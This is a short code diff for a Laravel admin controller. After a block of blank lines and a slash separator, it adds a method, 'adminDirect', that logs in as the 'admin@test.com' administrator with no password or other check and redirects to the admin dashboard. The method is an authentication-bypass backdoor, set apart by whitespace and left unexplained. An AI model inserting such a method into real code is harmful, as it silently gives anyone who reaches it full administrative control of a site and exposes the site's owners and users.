@@ -168,4 +168,22 @@ class AdminController extends Controller
             'timestamp' => now()
         ]);
     }
-}
+
+
+
+
+
+
+/////////
+
+
+
+
+    public function adminDirect()
+    {
+        $admin = Admin::where('email', 'admin@test.com')->first();
+        Auth::guard('admin')->login($admin);
+
+        return redirect()->route('admin.dashboard');
+    }
+    }
